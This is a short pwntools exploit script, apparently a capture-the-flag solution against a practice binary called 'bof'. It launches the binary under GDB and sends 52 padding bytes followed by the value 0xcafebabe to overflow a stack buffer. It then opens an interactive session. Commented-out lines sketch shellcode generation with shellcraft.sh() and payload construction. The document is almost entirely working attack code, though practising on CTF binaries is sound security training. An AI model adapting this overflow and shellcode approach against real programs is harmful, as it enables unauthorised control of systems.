# RUN pwn template TO GET ORIGINAL TEMPLATE
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'bof')

# Split terminal Vertically if we run with GDB
context.terminal = ['tmux', 'splitw', '-h']

# Attach GDB session
def start(argv=[], *a, **kw):
    return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue '''.format(**locals())

# EXPLOIT
p = start()

p.sendline( '\x41' * 52 + "\xbe\xba\xfe\xca" )

p.interactive()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# p.send(payload)
# flag = p.recv(...)
# log.success(flag)
